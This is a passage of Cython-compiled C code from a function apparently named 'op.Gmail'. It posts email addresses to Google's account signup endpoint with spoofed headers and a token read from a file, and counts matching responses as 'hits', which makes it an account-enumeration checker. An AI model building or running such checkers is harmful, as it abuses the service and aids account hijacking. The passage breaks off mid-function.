__Pyx_RefNannySetupContext("Gmail", 0);\n  __Pyx_INCREF(__pyx_v_email);\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_2);\n    __Pyx_XGOTREF(__pyx_t_3);\n     {\n\n      \n      __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_mstate_global->__pyx_kp_u__10, __pyx_v_email, Py_EQ)); if (unlikely((__pyx_t_4 < 0))) __PYX_ERR(0, 286, __pyx_L3_error)\n      if (__pyx_t_4) {\n\n        \n        __pyx_t_5 = __Pyx_PyObject_Unicode(__pyx_v_email); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 287, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __pyx_t_6 = PyUnicode_Split(((PyObject*)__pyx_t_5), __Pyx_NoneAsNull(__pyx_mstate_global->__pyx_kp_u__10), -1L); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 287, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_6);\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __pyx_t_5 = __Pyx_GetItemInt_List(__pyx_t_6, 0, long, 1, __Pyx_PyLong_From_long, 1, 0, 1, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 287, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n        __Pyx_DECREF_SET(__pyx_v_email, __pyx_t_5);\n        __pyx_t_5 = 0;\n\n        \n      }\n\n      \n      {\n        __Pyx_PyThreadState_declare\n        __Pyx_PyThreadState_assign\n        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);\n        __Pyx_XGOTREF(__pyx_t_7);\n        __Pyx_XGOTREF(__pyx_t_8);\n        __Pyx_XGOTREF(__pyx_t_9);\n         {\n\n          \n          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_mstate_global->__pyx_tuple[16], NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 290, __pyx_L10_error)\n          __Pyx_GOTREF(__pyx_t_12);\n          __pyx_t_11 = __pyx_t_12;\n          __Pyx_INCREF(__pyx_t_11);\n          __pyx_t_13 = 0;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_11, NULL};\n            __pyx_t_10 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_read, __pyx_callargs+__pyx_t_13, (1-__pyx_t_13) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\n            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 290, __pyx_L10_error)\n            __Pyx_GOTREF(__pyx_t_10);\n          }\n          __pyx_t_6 = __pyx_t_10;\n          __Pyx_INCREF(__pyx_t_6);\n          __pyx_t_13 = 0;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};\n            __pyx_t_5 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_splitlines, __pyx_callargs+__pyx_t_13, (1-__pyx_t_13) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 290, __pyx_L10_error)\n            __Pyx_GOTREF(__pyx_t_5);\n          }\n          __pyx_t_10 = __Pyx_GetItemInt(__pyx_t_5, 0, long, 1, __Pyx_PyLong_From_long, 0, 0, 1, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 290, __pyx_L10_error)\n          __Pyx_GOTREF(__pyx_t_10);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __pyx_v_o = __pyx_t_10;\n          __pyx_t_10 = 0;\n\n          \n        }\n        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n        goto __pyx_L15_try_end;\n        __pyx_L10_error:;\n        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n        \n         {\n          __Pyx_AddTraceback("op.Gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);\n          if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_5, &__pyx_t_6) < 0) __PYX_ERR(0, 291, __pyx_L12_except_error)\n          __Pyx_XGOTREF(__pyx_t_10);\n          __Pyx_XGOTREF(__pyx_t_5);\n          __Pyx_XGOTREF(__pyx_t_6);\n\n          \n          __pyx_t_16 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_mstate_global->__pyx_tuple[16], NULL); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 292, __pyx_L12_except_error)\n          __Pyx_GOTREF(__pyx_t_16);\n          __pyx_t_15 = __pyx_t_16;\n          __Pyx_INCREF(__pyx_t_15);\n          __pyx_t_13 = 0;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_15, NULL};\n            __pyx_t_14 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_read, __pyx_callargs+__pyx_t_13, (1-__pyx_t_13) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\n            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;\n            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 292, __pyx_L12_except_error)\n            __Pyx_GOTREF(__pyx_t_14);\n          }\n          __pyx_t_11 = __pyx_t_14;\n          __Pyx_INCREF(__pyx_t_11);\n          __pyx_t_13 = 0;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_11, NULL};\n            __pyx_t_12 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_splitlines, __pyx_callargs+__pyx_t_13, (1-__pyx_t_13) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n            if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 292, __pyx_L12_except_error)\n            __Pyx_GOTREF(__pyx_t_12);\n          }\n          __pyx_t_14 = __Pyx_GetItemInt(__pyx_t_12, 0, long, 1, __Pyx_PyLong_From_long, 0, 0, 1, 1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 292, __pyx_L12_except_error)\n          __Pyx_GOTREF(__pyx_t_14);\n          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\n          __Pyx_XDECREF_SET(__pyx_v_o, __pyx_t_14);\n          __pyx_t_14 = 0;\n          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n          goto __pyx_L11_exception_handled;\n        }\n\n        \n        __pyx_L12_except_error:;\n        __Pyx_XGIVEREF(__pyx_t_7);\n        __Pyx_XGIVEREF(__pyx_t_8);\n        __Pyx_XGIVEREF(__pyx_t_9);\n        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);\n        goto __pyx_L3_error;\n        __pyx_L11_exception_handled:;\n        __Pyx_XGIVEREF(__pyx_t_7);\n        __Pyx_XGIVEREF(__pyx_t_8);\n        __Pyx_XGIVEREF(__pyx_t_9);\n        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);\n        __pyx_L15_try_end:;\n      }\n\n      \n      __pyx_t_5 = __pyx_v_o;\n      __Pyx_INCREF(__pyx_t_5);\n      __pyx_t_13 = 0;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_mstate_global->__pyx_kp_u__7};\n        __pyx_t_6 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_split, __pyx_callargs+__pyx_t_13, (2-__pyx_t_13) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 294, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_6);\n      }\n      if ((likely(PyTuple_CheckExact(__pyx_t_6))) || (PyList_CheckExact(__pyx_t_6))) {\n        PyObject* sequence = __pyx_t_6;\n        Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);\n        if (unlikely(size != 2)) {\n          if (size > 2) __Pyx_RaiseTooManyValuesError(2);\n          else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);\n          __PYX_ERR(0, 294, __pyx_L3_error)\n        }\n        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n        if (likely(PyTuple_CheckExact(sequence))) {\n          __pyx_t_5 = PyTuple_GET_ITEM(sequence, 0);\n          __Pyx_INCREF(__pyx_t_5);\n          __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1);\n          __Pyx_INCREF(__pyx_t_10);\n        } else {\n          __pyx_t_5 = __Pyx_PyList_GetItemRef(sequence, 0);\n          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 294, __pyx_L3_error)\n          __Pyx_XGOTREF(__pyx_t_5);\n          __pyx_t_10 = __Pyx_PyList_GetItemRef(sequence, 1);\n          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 294, __pyx_L3_error)\n          __Pyx_XGOTREF(__pyx_t_10);\n        }\n        #else\n        __pyx_t_5 = __Pyx_PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 294, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __pyx_t_10 = __Pyx_PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 294, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_10);\n        #endif\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      } else {\n        Py_ssize_t index = -1;\n        __pyx_t_14 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 294, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_14);\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n        __pyx_t_17 = (CYTHON_COMPILING_IN_LIMITED_API) ? PyIter_Next : __Pyx_PyObject_GetIterNextFunc(__pyx_t_14);\n        index = 0; __pyx_t_5 = __pyx_t_17(__pyx_t_14); if (unlikely(!__pyx_t_5)) goto __pyx_L18_unpacking_failed;\n        __Pyx_GOTREF(__pyx_t_5);\n        index = 1; __pyx_t_10 = __pyx_t_17(__pyx_t_14); if (unlikely(!__pyx_t_10)) goto __pyx_L18_unpacking_failed;\n        __Pyx_GOTREF(__pyx_t_10);\n        if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_14), 2) < (0)) __PYX_ERR(0, 294, __pyx_L3_error)\n        __pyx_t_17 = NULL;\n        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n        goto __pyx_L19_unpacking_done;\n        __pyx_L18_unpacking_failed:;\n        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n        __pyx_t_17 = NULL;\n        if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);\n        __PYX_ERR(0, 294, __pyx_L3_error)\n        __pyx_L19_unpacking_done:;\n      }\n      __pyx_v_tl = __pyx_t_5;\n      __pyx_t_5 = 0;\n      __pyx_v_host = __pyx_t_10;\n      __pyx_t_10 = 0;\n\n      \n      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 297, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_Host_GAPS, __pyx_v_host) < (0)) __PYX_ERR(0, 297, __pyx_L3_error)\n      __pyx_v_cookies = ((PyObject*)__pyx_t_6);\n      __pyx_t_6 = 0;\n\n      \n      __pyx_t_6 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_authority, __pyx_mstate_global->__pyx_kp_u_accounts_google_com) < (0)) __PYX_ERR(0, 300, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_accept, __pyx_mstate_global->__pyx_kp_u__3) < (0)) __PYX_ERR(0, 300, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_accept_language, __pyx_mstate_global->__pyx_kp_u_en_US_en_q_0_9) < (0)) __PYX_ERR(0, 300, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_content_type, __pyx_mstate_global->__pyx_kp_u_application_x_www_form_urlencode) < (0)) __PYX_ERR(0, 300, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_google_accounts_xsrf, __pyx_mstate_global->__pyx_kp_u_1) < (0)) __PYX_ERR(0, 300, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_origin, __pyx_mstate_global->__pyx_kp_u_https_accounts_google_com) < (0)) __PYX_ERR(0, 300, __pyx_L3_error)\n\n      \n      __pyx_t_10 = PyNumber_Add(__pyx_mstate_global->__pyx_kp_u_https_accounts_google_com_signup_2, __pyx_v_tl); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 306, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_referer, __pyx_t_10) < (0)) __PYX_ERR(0, 300, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n\n      \n      __pyx_t_5 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_mstate_global->__pyx_n_u_ggb); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 307, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_14);\n      __pyx_t_13 = 1;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_14))) {\n        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_14);\n        assert(__pyx_t_5);\n        PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_14);\n        __Pyx_INCREF(__pyx_t_5);\n        __Pyx_INCREF(__pyx__function);\n        __Pyx_DECREF_SET(__pyx_t_14, __pyx__function);\n        __pyx_t_13 = 0;\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};\n        __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+__pyx_t_13, (1-__pyx_t_13) | (__pyx_t_13*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n        if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 307, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_10);\n      }\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_user_agent, __pyx_t_10) < (0)) __PYX_ERR(0, 300, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_v_headers = ((PyObject*)__pyx_t_6);\n      __pyx_t_6 = 0;\n\n      \n      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 310, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      if (PyDict_SetItem(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_TL, __pyx_v_tl) < (0)) __PYX_ERR(0, 310, __pyx_L3_error)\n      __pyx_v_params = ((PyObject*)__pyx_t_6);\n      __pyx_t_6 = 0;\n\n      \n      __pyx_t_6 = PyNumber_Add(__pyx_mstate_global->__pyx_kp_u_continue_https_3A_2F_2Fmail_goog, __pyx_v_tl); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 312, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __pyx_t_10 = PyNumber_Add(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_22_2C_22); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 312, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __pyx_t_6 = PyNumber_Add(__pyx_t_10, __pyx_v_email); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 312, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_t_10 = PyNumber_Add(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 312, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __pyx_v_data = __pyx_t_10;\n      __pyx_t_10 = 0;\n\n      \n      __pyx_t_6 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_mstate_global->__pyx_n_u_pp); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 314, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_14);\n\n      \n      __pyx_t_13 = 1;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_14))) {\n        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_14);\n        assert(__pyx_t_6);\n        PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_14);\n        __Pyx_INCREF(__pyx_t_6);\n        __Pyx_INCREF(__pyx__function);\n        __Pyx_DECREF_SET(__pyx_t_14, __pyx__function);\n        __pyx_t_13 = 0;\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2 + ((CYTHON_VECTORCALL) ? 4 : 0)] = {__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_https_accounts_google_com___sign_2};\n        __pyx_t_5 = __Pyx_MakeVectorcallBuilderKwds(4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 314, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_params, __pyx_v_params, __pyx_t_5, __pyx_callargs+2, 0) < (0)) __PYX_ERR(0, 314, __pyx_L3_error)\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_cookies, __pyx_v_cookies, __pyx_t_5, __pyx_callargs+2, 1) < (0)) __PYX_ERR(0, 314, __pyx_L3_error)\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_headers, __pyx_v_headers, __pyx_t_5, __pyx_callargs+2, 2) < (0)) __PYX_ERR(0, 314, __pyx_L3_error)\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_data, __pyx_v_data, __pyx_t_5, __pyx_callargs+2, 3) < (0)) __PYX_ERR(0, 314, __pyx_L3_error)\n        __pyx_t_10 = __Pyx_Object_Vectorcall_CallFromBuilder(__pyx_t_14, __pyx_callargs+__pyx_t_13, (2-__pyx_t_13) | (__pyx_t_13*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET), __pyx_t_5);\n        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n        if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 314, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_10);\n      }\n      __pyx_v_response = __pyx_t_10;\n      __pyx_t_10 = 0;\n\n      \n      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_mstate_global->__pyx_n_u_text); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 321, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __pyx_t_14 = __Pyx_PyObject_Unicode(__pyx_t_10); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 321, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_14);\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_t_4 = (__Pyx_PyUnicode_ContainsTF(__pyx_mstate_global->__pyx_kp_u_gf_uar_1, __pyx_t_14, Py_EQ)); if (unlikely((__pyx_t_4 < 0))) __PYX_ERR(0, 321, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n      if (__pyx_t_4) {\n\n        \n        __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_mstate_global->__pyx_n_u_hits); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 322, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_14);\n        __pyx_t_10 = __Pyx_PyLong_AddObjC(__pyx_t_14, __pyx_mstate_global->__pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 322, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_10);\n        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n        if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_hits, __pyx_t_10) < (0)) __PYX_ERR(0, 322, __pyx_L3_error)\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n\n        \n        __pyx_t_14 = NULL;\n        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_pppp); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 323, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __pyx_t_13 = 1;\n        #if CYTHON_UNPACK_METHODS\n        if (unlikely(PyMethod_Check(__pyx_t_5))) {\n          __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_5);\n          assert(__pyx_t_14);\n          PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_5);\n          __Pyx_INCREF(__pyx_t_14);\n          __Pyx_INCREF(__pyx__function);\n          __Pyx_DECREF_SET(__pyx_t_5, __pyx__function);\n          __pyx_t_13 = 0;\n        }\n        #endif\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_14, NULL};\n          __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_13, (1-__pyx_t_13) | (__pyx_t_13*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 323, __pyx_L3_error)\n          __Pyx_GOTREF(__pyx_t_10);\n        }\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n\n        \n        __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_mstate_global->__pyx_kp_u__10, __pyx_v_email, Py_NE)); if (unlikely((__pyx_t_4 < 0))) __PYX_ERR(0, 324, __pyx_L3_error)\n        if (__pyx_t_4) {\n\n          \n          __pyx_t_10 = PyNumber_Add(__pyx_v_email, __pyx_mstate_global->__pyx_kp_u_gmail_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 325, __pyx_L3_error)\n          __Pyx_GOTREF(__pyx_t_10);\n          __pyx_v_ok = __pyx_t_10;\n          __pyx_t_10 = 0;\n\n          \n          __pyx_t_5 = __pyx_v_ok;\n          __Pyx_INCREF(__pyx_t_5);\n          __pyx_t_13 = 0;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_mstate_global->__pyx_kp_u__10};\n            __pyx_t_10 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_split, __pyx_callargs+__pyx_t_13, (2-__pyx_t_13) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 326, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_10);\n          }\n          if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {\n            PyObject* sequence = __pyx_t_10;\n            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);\n            if (unlikely(size != 2)) {\n              if (size > 2) __Pyx_RaiseTooManyValuesError(2);\n              else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);\n              __PYX_ERR(0, 326, __pyx_L3_error)\n            }\n            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n            if (likely(PyTuple_CheckExact(sequence))) {\n              __pyx_t_5 = PyTuple_GET_ITEM(sequence, 0);\n              __Pyx_INCREF(__pyx_t_5);\n              __pyx_t_14 = PyTuple_GET_ITEM(sequence, 1);\n              __Pyx_INCREF(__pyx_t_14);\n            } else {\n              __pyx_t_5 = __Pyx_PyList_GetItemRef(sequence, 0);\n              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 326, __pyx_L3_error)\n              __Pyx_XGOTREF(__pyx_t_5);\n              __pyx_t_14 = __Pyx_PyList_GetItemRef(sequence, 1);\n              if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 326, __pyx_L3_error)\n              __Pyx_XGOTREF(__pyx_t_14);\n            }\n            #else\n            __pyx_t_5 = __Pyx_PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 326, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_5);\n            __pyx_t_14 = __Pyx_PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 326, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_14);\n            #endif\n            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n          } else {\n            Py_ssize_t index = -1;\n            __pyx_t_6 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 326, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_6);\n            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n            __pyx_t_17 = (CYTHON_COMPILING_IN_LIMITED_API) ? PyIter_Next : __Pyx_PyObject_GetIterNextFunc(__pyx_t_6);\n            index = 0; __pyx_t_5 = __pyx_t_17(__pyx_t_6); if (unlikely(!__pyx_t_5)) goto __pyx_L22_unpacking_failed;\n            __Pyx_GOTREF(__pyx_t_5);\n            index = 1; __pyx_t_14 = __pyx_t_17(__pyx_t_6); if (unlikely(!__pyx_t_14)) goto __pyx_L22_unpacking_failed;\n            __Pyx_GOTREF(__pyx_t_14);\n            if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_6), 2) < (0)) __PYX_ERR(0, 326, __pyx_L3_error)\n            __pyx_t_17 = NULL;\n            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n            goto __pyx_L23_unpacking_done;\n            __pyx_L22_unpacking_failed:;\n            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n            __pyx_t_17 = NULL;\n            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);\n            __PYX_ERR(0, 326, __pyx_L3_error)\n            __pyx_L23_unpacking_done:;\n          }\n          __pyx_v_username = __pyx_t_5;\n          __pyx_t_5 = 0;\n          __pyx_v_gg = __pyx_t_14;\n          __pyx_t_14 = 0;\n\n          \n          __pyx_t_14 = NULL;\n          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_InfoAcc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 327, __pyx_L3_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __pyx_t_13 = 1;\n          #if CYTHON_UNPACK_METHODS\n          if (unlikely(PyMethod_Check(__pyx_t_5))) {\n            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_5);\n            assert(__pyx_t_14);\n            PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_5);\n            __Pyx_INCREF(__pyx_t_14);\n            __Pyx_INCREF(__pyx__function);\n            